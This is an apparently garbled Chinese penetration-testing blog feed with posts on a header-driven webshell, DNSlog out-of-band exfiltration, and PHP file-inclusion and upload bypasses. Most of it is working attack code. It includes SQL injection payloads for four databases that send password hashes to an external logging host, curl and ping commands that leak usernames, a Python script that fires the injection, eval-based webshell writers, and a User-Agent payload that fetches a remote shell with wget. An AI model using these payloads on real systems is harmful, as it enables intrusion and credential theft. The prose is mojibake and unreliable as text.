<p>æ­£å¸¸æƒ…å†µï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">GET /pwet.htm HTTP/1.1</div><div class="line">Host: 192.168.73.143</div><div class="line">Accept-Encoding: identity</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-type: application/x-www-form-urlencoded</div><div class="line">Accept: */*</div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 03 Feb 2011 12:16:50 GMT</div><div class="line">Content-Length: 31</div><div class="line">Content-Type: text/html</div><div class="line">Last-Modified: Mon, 21 Jun 2010 11:53:19 GMT</div><div class="line">Accept-Ranges: bytes</div><div class="line">ETag: &quot;963779573811cb1:994&quot;</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">Pouetpouet</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>åŠ å…¥æ¶æ„å­—æ®µ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">GET /pwet.htm HTTP/1.1</div><div class="line">Host: 192.168.73.143</div><div class="line">Accept-Encoding: identity</div><div class="line">X-Order: ListDir</div><div class="line">Connection: Keep-Alive</div><div class="line">X-Data: Qzpc</div><div class="line">Content-type: application/x-www-form-urlencoded</div><div class="line">Accept: */*</div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 03 Feb 2011 12:16:57 GMT</div><div class="line">Content-Length: 353</div><div class="line">X-Resp: OK</div><div class="line">Content-Type: text/html</div><div class="line">Last-Modified: Mon, 21 Jun 2010 11:53:19 GMT</div><div class="line">Accept-Ranges: bytes</div><div class="line">ETag: &quot;963779573811cb1:994&quot;</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">Pouetpouet</div><div class="line"></div><div class="line">&lt;/html&gt;</div><div class="line">[F] C:\AUTOEXEC.BAT</div><div class="line">[F] C:\boot.ini</div><div class="line">[F] C:\bootfont.bin</div><div class="line">[F] C:\CONFIG.SYS</div><div class="line">[D] C:\Documents and Settings</div><div class="line">[D] C:\Inetpub</div><div class="line">[F] C:\IO.SYS</div><div class="line">[F] C:\MSDOS.SYS</div><div class="line">[F] C:\NTDETECT.COM</div><div class="line">[F] C:\ntldr</div><div class="line">[F] C:\pagefile.sys</div><div class="line">[D] C:\Program Files</div><div class="line">[D] C:\System Volume Information</div><div class="line">[D] C:\WINDOWS</div><div class="line">[D] C:\wmpub</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•å°æŠ€å·§ä¹‹DNSlog]]></title>
      <url>/2016/12/04/dnslog%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>åœ¨æ¸—é€ç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ç–‘ä¼¼å‘½ä»¤æ‰§è¡Œè¿˜æœ‰äº›boolæ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰å›æ˜¾ã€‚</p>
<a id="more"></a>
<p>å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬å¯èƒ½ä¼šç”¨å„ç§å„æ ·çš„è¯·æ±‚æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå¯¹äºboolæ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥è¿™ä¸¤ç§æ³¨å…¥ç±»å‹çš„ç¼ºç‚¹å°±æ˜¯é€Ÿåº¦æ…¢ï¼Œæ•ˆç‡ä½ï¼Œä¸€ä¸ªæ˜¯åŸºäºå¯¹é”™åˆ¤æ–­æ•°æ®ï¼Œä¸€ä¸ªæ˜¯åŸºäºè®¿é—®æ—¶é—´æ¥åˆ¤æ–­æ•°æ®ï¼Œdnslogçš„å‡ºç°å°±æ­£å¥½å¼¥è¡¥äº†è¿™æ ·çš„ç¼ºé™·ã€‚</p>
<h1 id="0x00-åŸç†"><a href="#0x00-åŸç†" class="headerlink" title="0x00 åŸç†"></a>0x00 åŸç†</h1><p>è¿™é‡Œå‚è€ƒ<a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="external">ä¸€ç¯‡paper</a> ,ä¸€ä¸ªå¤§ç‰›çš„è¯¦ç»†è§£é‡Š:<a href="https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks" target="_blank" rel="external">DNS in SQL Injection Attacks</a></p>
<p>ç®€å•è¯´å°±æ˜¯ï¼šDNSLog ç”¨äºç›‘æµ‹ DNS å’Œ HTTP è®¿é—®è®°å½•ï¼Œå¯é€šè¿‡HTTPè¯·æ±‚ï¼Œè®©ç›®æ ‡ä¸»æœºä¸»åŠ¨<br>è¯·æ±‚ DNSLog API åœ°å€ï¼Œæœ‰ç›¸åº”çš„è§£æè®°å½•ï¼Œåˆ™å¯åˆ¤å®šä¸ºå­˜åœ¨ç›¸åº”çš„æ¼æ´ã€‚</p>
<h1 id="0x01-åˆ©ç”¨"><a href="#0x01-åˆ©ç”¨" class="headerlink" title="0x01 åˆ©ç”¨"></a>0x01 åˆ©ç”¨</h1><p>é¦–å…ˆç»™å¤§å®¶åˆ†äº«<a href="http://ceye.io/" target="_blank" rel="external">ä¸€ä¸ªå…è´¹çš„dnslogå¹³å°</a>(ps:è¦æ˜¯æœ‰cloudeyeæ¿€æ´»ç çš„å¯ä»¥å¿½ç•¥)ã€‚</p>
<p>å¹³å°ä¼šç»™æ¯ä¸€ä¸ªä¼šå‘˜åˆ†ä¸€ä¸ªäºŒçº§åŸŸåï¼Œ<code>xxx.ceye.io</code>ã€‚</p>
<p>ç®€å•çš„æ¥è¯´ï¼Œdnslogå¹³å°è‡ªå·±ä¿ç•™dnsçš„æ—¥å¿—ä¿¡æ¯ï¼Œå¹¶å¯¹åº”æ¯ä¸ªä¼šå‘˜ä¸€ä¸ªäºŒçº§åŸŸåï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡</p>
<blockquote>
<p>ping test.xxxxx.ceye.io</p>
</blockquote>
<p>è¿™æ ·çš„å¤šçº§åŸŸåæ–¹å¼ï¼ŒæŠŠæˆ‘ä»¬éœ€è¦è¿”å›çš„ä¿¡æ¯é“¾æ¥åˆ°urlä¸­ï¼Œç„¶ååˆ†ææ—¥å¿—ï¼Œtestéƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯ã€‚</p>
<h2 id="0x01-1-å‘½ä»¤æ‰§è¡Œ"><a href="#0x01-1-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x01.1 å‘½ä»¤æ‰§è¡Œ"></a>0x01.1 å‘½ä»¤æ‰§è¡Œ</h2><p>åœ¨æˆ‘ä»¬æ‰¾åˆ°å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œè¿™æ ·çš„å‘½ä»¤åˆ¤æ–­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">linux:</div><div class="line">curl http://ip.port.domain.ceye.io/`whoami`</div><div class="line">ping `whoami`.ip.port.domain.ceye.io</div><div class="line">windows:</div><div class="line">ping %USERNAME%.domain.ceye.io</div></pre></td></tr></table></figure>
<p>è¿™æ—¶å€™å°±å¯ä»¥å»dnslogç“¶ä½“æŸ¥çœ‹åˆ°ä¿¡æ¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog1.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog2.png" alt=""></p>
<h2 id="0x01-2-SQLæ³¨å…¥"><a href="#0x01-2-SQLæ³¨å…¥" class="headerlink" title="0x01.2 SQLæ³¨å…¥"></a>0x01.2 SQLæ³¨å…¥</h2><p><strong>SQL Server</strong><br>å­˜å‚¨ç¨‹åºmaster..xp_dirtreeï¼ˆï¼‰ç”¨äºè·å–æ‰€æœ‰æ–‡ä»¶å¤¹çš„åˆ—è¡¨å’Œç»™å®šæ–‡ä»¶å¤¹å†…éƒ¨çš„å­æ–‡ä»¶å¤¹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">DECLARE @host varchar(1024);</div><div class="line">æ³¨å†Œä¸€ä¸ªåä¸º@hostçš„å˜é‡ï¼Œç±»å‹ä¸ºvarcharã€‚</div><div class="line">SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;</div><div class="line">è·å–db_name()ç„¶åè½¬æ¢æˆvarcharç±»å‹ï¼Œç„¶åå§è·å–çš„db_name()è¿”å›å€¼æ‹¼æ¥åˆ°dnslogå¹³å°ç»™æˆ‘ä»¬çš„å­åŸŸåé‡Œé¢ï¼Œç„¶åèµ‹å€¼ç»™@hostå˜é‡ã€‚</div><div class="line">EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</div><div class="line">åˆ—è¿œç¨‹ä¸»æœºçš„foobar$ç›®å½•,ç”±äºæ˜¯è¿œç¨‹ä¸»æœºï¼Œæ‰€ä»¥ä¼šåšä¸€ä¸ªdnsè§£æï¼Œè¿™æ ·æˆ‘ä»¬çš„dnså¹³å°å°±èƒ½å¾—åˆ°æ—¥å¿—äº†</div><div class="line"></div><div class="line">http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--</div></pre></td></tr></table></figure></p>
<p><strong>Oracle</strong><br>UTL_INADDRåŒ…ç”¨äºäº’è”ç½‘çš„å¯»å€â€“è¯¸å¦‚æ£€ç´¢æœ¬åœ°å’Œè¿œç¨‹ä¸»æœºçš„ä¸»æœºåå’ŒIPçš„åœ°å€<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</div><div class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</div><div class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div></pre></td></tr></table></figure></p>
<p><strong>MySQL</strong><br>MySQLçš„å‡½æ•°LOAD_FILE()è¯»å–æ–‡ä»¶å†…å®¹å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼šLOAD_FILE()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM user WHERE user=&apos;root&apos; LIMIT 1),&apos;.b182oj.ceye.io\\abc&apos;));</div></pre></td></tr></table></figure></p>
<p><strong>PostgreSQL</strong><br>PostgreSQLçš„å£°æ˜COPYç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å’Œè¡¨ä¹‹é—´æ‹·è´æ•°æ®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">DROP TABLE IF EXISTS table_output;</div><div class="line">CREATE TABLE table_output(content text);</div><div class="line">CREATE OR REPLACE FUNCTION temp_function()</div><div class="line">RETURNS VOID AS $$</div><div class="line">DECLARE exec_cmd TEXT;</div><div class="line">DECLARE query_result TEXT;</div><div class="line">BEGIN</div><div class="line">SELECT INTO query_result (SELECT passwd</div><div class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</div><div class="line">exec_cmd := E&apos;COPY table_output(content)</div><div class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</div><div class="line">EXECUTE exec_cmd;</div><div class="line">END;</div><div class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</div><div class="line">SELECT temp_function();</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog4.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog5.png" alt=""></p>
<p>å†™ä¸ªè„šæœ¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import urllib2</div><div class="line"></div><div class="line">for i in range(50):</div><div class="line">    if i==0:</div><div class="line">        continue</div><div class="line">    url = &apos;&apos;&apos;http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--&apos;&apos;&apos;</div><div class="line">    url = url.replace(&quot;dbid=1&quot;,&quot;dbid=&quot;+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    print req.get_full_url()</div><div class="line">    print urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•çš„ä¸€äº›å°æŠ€å·§]]></title>
      <url>/2016/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>ç»“åˆæœ€è¿‘å­¦ä¹ çš„çŸ¥è¯†ï¼Œæ€»ç»“ä¸€ä¸‹æ¸—é€æµ‹è¯•ä¸­çš„ä¸€äº›å°æŠ€å·§ï¼Œä»…åšå‚è€ƒã€‚</p>
<a id="more"></a>
<h1 id="0x01-PHPæ–‡ä»¶åŒ…å«"><a href="#0x01-PHPæ–‡ä»¶åŒ…å«" class="headerlink" title="0x01 PHPæ–‡ä»¶åŒ…å«"></a>0x01 PHPæ–‡ä»¶åŒ…å«</h1><p><strong>åˆ©ç”¨ç½‘ç«™æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½:</strong>ï¼Œæ¯”å¦‚ä¸Šä¼ å¤´åƒä¹‹ç±»ï¼Œå¯ä»¥å°è¯•åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p>
<p><strong>åˆ©ç”¨phpå°è£…åè®®<code>php://input</code>å’Œ<code>data://</code>:</strong>ï¼ŒåŒ…å«postæ•°æ®é€ æˆphpå‘½ä»¤æ‰§è¡Œ.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://example.com/test.php?url=php://input</div><div class="line">POST:&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&apos;)?&gt;</div></pre></td></tr></table></figure>
<p><strong>åŒ…å«logæ—¥å¿—æ–‡ä»¶:</strong>å½“æˆ‘ä»¬æäº¤æ¶æ„ä»£ç æ—¶ä¹Ÿä¼šè¢«è®°å½•ï¼Œç»“åˆè§£ææ¼æ´å³å¯getshell(æœ‰è¯»æƒé™)ã€‚</p>
<p>apacheæ—¥å¿—é»˜è®¤åœ¨<code>/etc/httpd/logs/access_log</code>;</p>
<p>åœ¨æ—¥å¿—æ–‡ä»¶ä¸­æ’å…¥PHPä»£ç </p>
<p>æ–¹æ³•ä¸€ :ä½¿ç”¨burpsuitæŠ“åŒ…è®¿é—® ï¼Œç»•è¿‡æµè§ˆå™¨ç¼–ç &lt;&gt;</p>
<p>æ–¹æ³•äºŒ :curl è®¿é—®ä¸å­˜åœ¨çš„url</p>
<blockquote>
<p>curl <a href="http://example/shell.php?=" target="_blank" rel="external">http://example/shell.php?=</a>&lt;?php phpinfo();?&gt;  </p>
</blockquote>
<p>è¿™æ ·phpä»£ç å°±è¢«å†™åˆ°logé‡Œé¢äº† åŒ…å«ä¸€ä¸‹æ—¥å¿—ï¼š</p>
<blockquote>
<p><a href="http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log" target="_blank" rel="external">http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log</a></p>
</blockquote>
<p><strong>åŒ…å«/proc/self/environæ–‡ä»¶:</strong>è¿™éœ€è¦PHPè¿è¡Œä½œä¸ºä¸€ä¸ªå…·æœ‰<code>cgion/proc</code>ä¼ªæ–‡ä»¶çš„ç³»ç»Ÿä¸”PHPè„šæœ¬æœ‰æƒè®¿é—®è¿™äº›ä¼ªæ–‡ä»¶ã€‚</p>
<pre><code>å¡«å†™User-Agentå­—æ®µå¦‚ä¸‹ï¼š&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt;
</code></pre><p><strong>åŒ…å«ä¼šè¯æ–‡ä»¶:</strong>è¿™éœ€è¦æ”»å‡»è€…èƒ½æ§åˆ¶ä¼šè¯ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²å€¼ï¼ˆæ³¨å…¥ä»£ç ï¼Œä¾‹å¦‚<code>phpinfo(ï¼‰</code>ï¼Œä¼šè¯æ–‡ä»¶å¿…é¡»å­˜æ”¾åœ¨serializedsessionæ–‡ä»¶ä¸”PHPè„šæœ¬èƒ½å¤Ÿè®¿é—®ä¼šè¯æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯<code>/tmp/sess_SESSIONID</code>æ–‡ä»¶ï¼‰ã€‚</p>
<p><strong>åŒ…å«å…¶ä»–ç”±phpåº”ç”¨åˆ›å»ºçš„æ–‡ä»¶:</strong>åªè¦ä½ èƒ½æƒ³åˆ°çš„ï¼Œéƒ½å¯ä»¥å°è¯•åˆ›å»º,ç„¶ååŒ…å«ä»–ï¼Œæ¯”å¦‚æ•°æ®åº“æ–‡ä»¶ï¼Œç¼“å­˜æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºçº§åˆ«çš„æ—¥å¿—ã€‚</p>
<h1 id="0x02-åˆ©ç”¨-htaccessæ–‡ä»¶ç»•è¿‡é»‘åå•"><a href="#0x02-åˆ©ç”¨-htaccessæ–‡ä»¶ç»•è¿‡é»‘åå•" class="headerlink" title="0x02 åˆ©ç”¨.htaccessæ–‡ä»¶ç»•è¿‡é»‘åå•"></a>0x02 åˆ©ç”¨<code>.htaccess</code>æ–‡ä»¶ç»•è¿‡é»‘åå•</h1><p><code>.htaccess</code>æ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚è‡ªå®šä¹‰<code>.htaccess</code>ä¸Šä¼ ï¼Œå†…å®¹å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FileMatch â€œshell.jpgâ€&gt;  </div><div class="line">SetHandler application/x-httpd-php  </div><div class="line">&lt;/FileMatch&gt;</div></pre></td></tr></table></figure></p>
<p>åŒç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªshell.jpgæ–‡ä»¶ï¼Œå†…å®¹æ˜¯ä¸€å¥è¯ï¼Œè¿™ä¸ªæ—¶å€™å°±æˆåŠŸç»•è¿‡ã€‚</p>
<h1 id="0x03-PHPæµå°è£…ç»•è¿‡æˆªæ–­"><a href="#0x03-PHPæµå°è£…ç»•è¿‡æˆªæ–­" class="headerlink" title="0x03 PHPæµå°è£…ç»•è¿‡æˆªæ–­"></a>0x03 PHPæµå°è£…ç»•è¿‡æˆªæ–­</h1><p>æŠ€å·§æ¥æºï¼šç‹æ¾</p>
<p>å‡è®¾å­˜åœ¨æ–‡ä»¶åŒ…å«çš„ä»£ç ä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">$a = $_GET[&apos;file&apos;];</div><div class="line">include $a.&apos;.html.php&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯æˆ‘ä»¬<code>%00</code>æ— æ³•æˆªæ–­, åªèƒ½åŒ…å«<code>xxxx.html.php</code> é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ä¸ª<code>hello.html.php</code>ï¼Œå†…å®¹ä¸º<code>phpinfo()</code>;</p>
<p>ç„¶åå‹ç¼©æˆzip</p>
<p>ç„¶åè®¿é—®å¦‚ä¸‹ç½‘å€,å³å¯æˆåŠŸåŒ…å«å‹ç¼©æ–‡ä»¶å†…çš„<code>hello.html.php</code></p>
<p><code>http://example/index.php?file=zip://test.zip%23hello</code></p>
<p>æŠŠæˆ‘ä»¬è¾“å…¥çš„å˜é‡å’Œincludeåé¢çš„å˜é‡åˆèµ·æ¥å°±æ˜¯<code>zip://test.zip#hello.html.php</code></p>
<p>ä»£è¡¨å½“å‰ç›®å½•ä¸‹çš„<code>test.zip</code>å‹ç¼©åŒ…é‡Œé¢çš„<code>hello.html.php</code>,äºæ˜¯å°±åŒ…å«æˆåŠŸã€‚</p>
<h1 id="0x04-é€šç”¨é˜²æ³¨å…¥ç³»ç»Ÿgetshell"><a href="#0x04-é€šç”¨é˜²æ³¨å…¥ç³»ç»Ÿgetshell" class="headerlink" title="0x04 é€šç”¨é˜²æ³¨å…¥ç³»ç»Ÿgetshell"></a>0x04 é€šç”¨é˜²æ³¨å…¥ç³»ç»Ÿgetshell</h1><p>å¾ˆå¤šäººæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°é˜²æ³¨å…¥ç³»ç»Ÿï¼Œæ¯”å¦‚è¯´è®°å½•äº†ipï¼Œæ—¶é—´ï¼Œæäº¤æ•°æ®ç­‰ç­‰ï¼Œé€šè¿‡é˜…è¯»ç±»ä¼¼ç¨‹åºçš„æºç å¾—çŸ¥æ•°æ®è®°å½•åœ¨<code>sqlin.asp</code>ã€‚</p>
<p>æäº¤å¦‚ä¸‹æ•°æ®ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">â”¼æ” æ•¸ç•£æ•´çˆ ç…¥æ•µç‘³âˆ¨â‰¡â”©æ„¾           å¯†ç  a  (åŠ å¯†æ–¹å¼æ˜¯:ANSI-&gt;Unicodeï¼›å·¥å…·ï¼šUNICODE2ANSI)</div><div class="line"></div><div class="line">æäº¤ and 1= â”¼æ” æ•¸ç•£æ•´çˆ ç…¥æ•µç‘³âˆ¨â‰¡â”©æ„¾</div></pre></td></tr></table></figure></p>
<p>èœåˆ€è¿æ¥<code>sqlin.asp</code>å³å¯ã€‚</p>
<h1 id="0x05-iis-phpé»‘åå•ä¸Šä¼ çªç ´"><a href="#0x05-iis-phpé»‘åå•ä¸Šä¼ çªç ´" class="headerlink" title="0x05 iis+phpé»‘åå•ä¸Šä¼ çªç ´"></a>0x05 iis+phpé»‘åå•ä¸Šä¼ çªç ´</h1><p>æŠ€å·§æ¥æºï¼šPç‰›</p>
<p>åœ¨php+window+iisç¯å¢ƒä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">åŒå¼•å·==ç‚¹å·;</div><div class="line">å¤§äºç¬¦å·==é—®å·;</div><div class="line">å°äºç¬¦å·(â€œ&lt;â€)==æ˜Ÿå·(â€œ*â€);</div></pre></td></tr></table></figure></p>
<p>è¯¥ç‰¹æ€§åªèƒ½ç”¨äºæ–‡ä»¶ä¸Šä¼ æ—¶è¦†ç›–å·²çŸ¥çš„æ–‡ä»¶ï¼Œäºæ˜¯è¿™ç‰¹æ€§ä¾¿ç•¥æ˜¾é¸¡è‚‹.ä¸è¿‡Pç‰›å·²ç»ç»™å‡ºå®Œç¾åˆ©ç”¨çš„æ–¹æ³•ï¼š</p>
<p><strong>æ€è·¯å¦‚ä¸‹ï¼š</strong></p>
<ol>
<li>åˆ©ç”¨å†’å·â€œï¼šâ€æˆªæ–­</li>
<li>åˆ©ç”¨â€œ&lt;â€==â€œ*â€è¦†ç›–ä¸Šä¼ æ–‡ä»¶</li>
</ol>
<p>æˆ‘ä»¬éƒ½çŸ¥é“åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šè€ƒè™‘åˆ°æ–‡ä»¶åæˆªæ–­ï¼Œå¦‚<code>%00</code>,<code>:</code>å»æˆªæ–­ï¼Œå¦‚ï¼š<code>bypass.php:jpg</code><br>ä½†æ˜¯å†’å·æˆªæ–­äº§ç”Ÿçš„æ–‡ä»¶æ˜¯ç©ºç™½çš„ï¼Œé‡Œé¢å¹¶ä¸ä¼šæœ‰ä»»ä½•çš„å†…å®¹,è™½ç„¶ç”Ÿæˆçš„phpæ–‡ä»¶é‡Œé¢æ²¡æœ‰å†…å®¹ï¼Œä½†æ˜¯phpæ–‡ä»¶æ€»ç”Ÿæˆäº†å§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šé¢æ‰€è¯´çš„ç‰¹æ€§å®Œç¾æˆåŠŸåˆ©ç”¨.</p>
<ol>
<li>é¦–å…ˆåˆ©ç”¨å†’å·ç”Ÿæˆæˆ‘ä»¬å°†è¦è¦†ç›–çš„phpæ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶åä¸º<code>bypass.php:jpg</code>çš„æ–‡ä»¶ï¼Œæˆªæ–­ä¹‹åäº§ç”Ÿä¸€ä¸ª<code>bypass.php</code>çš„ç©ºç™½phpæ–‡ä»¶ã€‚</li>
<li>åˆ©ç”¨ä¸Šé¢çš„ç³»ç»Ÿç‰¹æ€§è¦†ç›–è¯¥æ–‡ä»¶ï¼š<code>&lt;</code>å°±ç­‰äº <code>*</code>,è€Œ<code>*</code>ä»£è¡¨ä»»æ„å­—ç¬¦burpé‡Œä¿®æ”¹æ–‡ä»¶åä¸º<code>bypass.&lt;&lt;&lt;</code>å†…å®¹ä¸ºä¸€å¥è¯ï¼Œè¿™æ ·ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„<code>bypass.php</code>æ–‡ä»¶ã€‚</li>
</ol>
